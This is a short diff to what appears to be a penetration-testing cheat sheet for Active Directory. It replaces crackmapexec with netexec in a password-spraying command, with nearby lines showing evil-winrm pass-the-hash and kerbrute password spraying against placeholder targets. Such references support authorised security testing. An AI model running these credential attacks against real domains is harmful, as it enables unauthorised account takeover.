@@ -139,7 +139,7 @@ evil-winrm -i TARGET -u Administrator -H NTLM_HASH
 **Password spraying:**
 ```bash
 # Check lockout policy first: net accounts /domain
-crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
+netexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
 kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password123'
 ```
 
